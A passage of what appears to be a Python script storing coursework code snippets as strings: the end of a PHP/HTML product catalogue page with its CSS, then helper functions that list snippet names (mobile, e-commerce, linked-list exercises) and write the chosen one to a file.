                <a href="?category=all" class="category-btn <?php echo $selected_category === 'all' ? 'active' : ''; ?>">All</a>
                <a href="?category=phones" class="category-btn <?php echo $selected_category === 'phones' ? 'active' : ''; ?>">Phones</a>
                <a href="?category=audio" class="category-btn <?php echo $selected_category === 'audio' ? 'active' : ''; ?>">Audio</a>
                <a href="?category=wearables" class="category-btn <?php echo $selected_category === 'wearables' ? 'active' : ''; ?>">Wearables</a>
                <a href="?category=laptops" class="category-btn <?php echo $selected_category === 'laptops' ? 'active' : ''; ?>">Laptops</a>
            </div>
        </header>

        <section class="catalogue-products">
            <div class="product-grid">
                <?php foreach ($filtered_products as $product): ?>
                    <div class="product-item" data-category="<?php echo htmlspecialchars($product['category']); ?>">
                        <img src="<?php echo htmlspecialchars($product['image']); ?>" alt="<?php echo htmlspecialchars($product['name']); ?>" class="product-image">
                        <h3><?php echo htmlspecialchars($product['name']); ?></h3>
                        <p class="category"><?php echo ucfirst(htmlspecialchars($product['category'])); ?></p>
                        <p class="price">$<?php echo number_format($product['price'], 2); ?></p>
                        <p class="description"><?php echo htmlspecialchars($product['description']); ?></p>
                        <div class="product-actions">
                            <form method="POST" action="">
                                <input type="hidden" name="product_id" value="<?php echo $product['id']; ?>">
                                <button type="submit" name="add_to_cart" class="btn add-to-cart">Add to Cart</button>
                            </form>

                            <form method="POST" action="">
                                <input type="hidden" name="product_id" value="<?php echo $product['id']; ?>">
                                <button type="submit" name="add_to_wishlist" class="btn wishlist">Add to Wishlist</button>
                            </form>
                        </div>
                    </div>
                <?php endforeach; ?>
                <?php if (empty($filtered_products)): ?>
                    <p class="no-products">No products found.</p>
                <?php endif; ?>
            </div>
        </section>

    </div>
</body>
</html>

/* Reset default styles for consistency across browsers */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

/* Body with professional, clean background */
body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #f7f9fc;
    color: #1a202c;
    line-height: 1.6;
}

/* Fake navbar styling for design purposes */
.navbar {
    background: #ffffff;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    padding: 16px 32px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

/* Navbar brand logo or name */
.nav-brand {
    font-size: 24px;
    font-weight: 700;
    color: #3182ce;
}

/* Navbar links (non-functional) */
.nav-links {
    list-style: none;
    display: flex;
    gap: 24px;
}

.nav-links li a {
    text-decoration: none;
    color: #4a5568;
    font-size: 15px;
    font-weight: 500;
    transition: color 0.2s ease;
}

.nav-links li a:hover {
    color: #3182ce;
}

/* Main container for catalogue content */
.catalogue-container {
    max-width: 1100px;
    margin: 0 auto;
    padding: 32px 16px;
}

/* Header with title and category filter */
.catalogue-header {
    text-align: center;
    margin-bottom: 40px;
}

.catalogue-header h1 {
    font-size: 30px;
    font-weight: 700;
    color: #1a202c;
    margin-bottom: 8px;
}

.catalogue-header p {
    font-size: 16px;
    color: #4a5568;
    margin-bottom: 20px;
}

/* Category filter buttons (styled as links in PHP) */
.category-filter {
    display: flex;
    justify-content: center;
    gap: 12px;
    flex-wrap: wrap;
}

.category-btn {
    padding: 8px 16px;
    border: none;
    border-radius: 6px;
    background: #e2e8f0;
    color: #1a202c;
    font-size: 14px;
    font-weight: 500;
    text-decoration: none;
    transition: background 0.2s ease, color 0.2s ease;
}

.category-btn:hover {
    background: #cbd5e0;
}

.category-btn.active {
    background: #3182ce;
    color: #ffffff;
}

/* Cart section styling */
.cart-section {
    background: #ffffff;
    padding: 16px;
    border-radius: 8px;
    box-shadow: 0 3px 12px rgba(0, 0, 0, 0.08);
    margin-bottom: 32px;
}

.cart-section h2 {
    font-size: 22px;
    font-weight: 600;
    color: #1a202c;
    margin-bottom: 12px;
    text-align: center;
}

.cart-items {
    display: flex;
    flex-direction: column;
    gap: 12px;
}

.cart-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 8px;
    border-bottom: 1px solid #e2e8f0;
}

.cart-item span {
    font-size: 14px;
    color: #4a5568;
}

.cart-total {
    text-align: right;
    padding: 12px 8px;
    font-size: 16px;
    color: #1a202c;
}

.no-items {
    text-align: center;
    font-size: 16px;
    color: #4a5568;
    padding: 12px;
}

/* Product grid section */
.catalogue-products {
    margin-bottom: 32px;
}

.product-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
    gap: 24px;
}

/* Individual product card */
.product-item {
    background: #ffffff;
    padding: 16px;
    border-radius: 8px;
    box-shadow: 0 3px 12px rgba(0, 0, 0, 0.08);
    text-align: center;
    transition: transform 0.2s ease, box-shadow 0.2s ease;
}

.product-item:hover {
    transform: translateY(-4px);
    box-shadow: 0 6px 16px rgba(0, 0, 0, 0.12);
}

/* Product image styling */
.product-image {
    width: 100%;
    height: 180px;
    object-fit: cover;
    border-radius: 6px;
    margin-bottom: 12px;
}

/* Product name */
.product-item h3 {
    font-size: 18px;
    font-weight: 600;
    color: #1a202c;
    margin-bottom: 4px;
}

/* Product category */
.category {
    font-size: 13px;
    color: #718096;
    margin-bottom: 8px;
}

/* Product price */
.price {
    font-size: 16px;
    font-weight: 500;
    color: #3182ce;
    margin-bottom: 8px;
}

/* Product description */
.description {
    font-size: 14px;
    color: #4a5568;
    margin-bottom: 12px;
}

/* Container for action buttons */
.product-actions {
    display: flex;
    gap: 8px;
    justify-content: center;
}

/* General button styling */
.btn {
    padding: 8px 16px;
    border: none;
    border-radius: 6px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s ease, transform 0.1s ease;
}

/* Add to Cart button */
.add-to-cart {
    background: #3182ce;
    color: #ffffff;
}

.add-to-cart:hover {
    background: #2b6cb0;
}

/* Wishlist button */
.wishlist {
    background: #e2e8f0;
    color: #1a202c;
}

.wishlist:hover {
    background: #cbd5e0;
}

.btn:active {
    transform: translateY(1px);
}

/* No products message */
.no-products {
    text-align: center;
    font-size: 16px;
    color: #4a5568;
    padding: 20px;
}

/* Responsive design for smaller screens */
@media (max-width: 768px) {
    .catalogue-container {
        padding: 24px 12px;
    }

    .navbar {
        padding: 12px 16px;
        flex-direction: column;
        gap: 12px;
    }

    .nav-links {
        gap: 16px;
    }

    .catalogue-header h1 {
        font-size: 26px;
    }

    .product-grid {
        grid-template-columns: 1fr;
    }

    .product-image {
        height: 200px;
    }

    .cart-item {
        flex-direction: column;
        align-items: flex-start;
        gap: 4px;
    }
}

@media (max-width: 400px) {
    .catalogue-header p {
        font-size: 14px;
    }

    .category-btn {
        padding: 6px 12px;
        font-size: 13px;
    }

    .product-item {
        padding: 12px;
    }

    .btn {
        padding: 6px 12px;
        font-size: 13px;
    }
}

/* Search form styling */
.search-form {
    display: flex;
    justify-content: center;
    align-items: center;
    margin-bottom: 20px;
    padding: 10px 0;
}

.search-form input[type="text"] {
    width: 300px;
    padding: 10px;
    font-size: 16px;
    border: 1px solid #e2e8f0;
    border-radius: 6px;
    background-color: #ffffff;
    color: #4a5568;
    transition: border-color 0.2s ease;
}

.search-form input[type="text"]:focus {
    border-color: #3182ce;
    outline: none;
}

.search-form button {
    padding: 10px 16px;
    margin-left: 10px;
    background-color: #3182ce;
    color: white;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-size: 16px;
    transition: background-color 0.2s ease;
}

.search-form button:hover {
    background-color: #2b6cb0;
}

.search-form button:focus {
    outline: none;
}

/* Responsive design for search form */
@media (max-width: 768px) {
    .search-form {
        flex-direction: column;
        gap: 10px;
    }

    .search-form input[type="text"] {
        width: 100%;
    }

    .search-form button {
        width: 100%;
    }
}

'''

def iss_():
    for file,code in iss_codes.items():
        print(file)
    filename = input("Enter filename: ")
    with open(filename, 'w') as f:
        f.write(iss_codes[filename])
        
def itc_():
    for file,code in itc_codes.items():
        print(file)
    filename = input("Enter filename: ")
    with open(filename, 'w') as f:
        f.write(itc_codes[filename])


mob_codes = {
    "toast.txt": toast,
    "listview.txt": listview,
    "checkbox.txt": checkbox,
    "dateTime.txt": dateTime,
    "oneActToOther.txt": oneActToOtherAndToast,
    'radiobtn.txt': radiobtn,
    'sharedPref.txt': sharedPrefrence,
    'loginForm.txt': loginForm,
    'lifecycle.txt': lifecycle,
    'flutter1.txt':fluterexp1,
    'flutter2.txt':flutterexp2

}

def mob_():
    for file,code in mob_codes.items():
        print(file)
    filename = input("Enter filename: ")
    with open(filename, 'w') as f:
        f.write(mob_codes[filename])


ecomm_codes = {

    "loginregister.txt":login_register,
    "wishlist.txt":wishlist,
    "catalog.txt":catalog,
    "cart.txt":cart,
    "checkout.txt":checkout

}

def ecomm_():
    for file,code in ecomm_codes.items():
        print(file)
    filename = input("Enter filename: ")
    with open(filename, 'w') as f:
        f.write(ecomm_codes[filename])
        

dsa_codes = {
    "singly_linked_list.txt": singly_linked_list,
    "doubly_linked_list.txt": doubly_linked_list,
    "circular_linked_list.txt": circular_linked_list,
    "doubly_circular_linked_list.txt": doubly_circular_linked_list
}

def dsa_():
    for file,code in dsa_codes.items():
        print(file)
    filename = input("Enter filename: ")
    with open(filename, 'w') as f:
        f.write(dsa_codes[filename])
          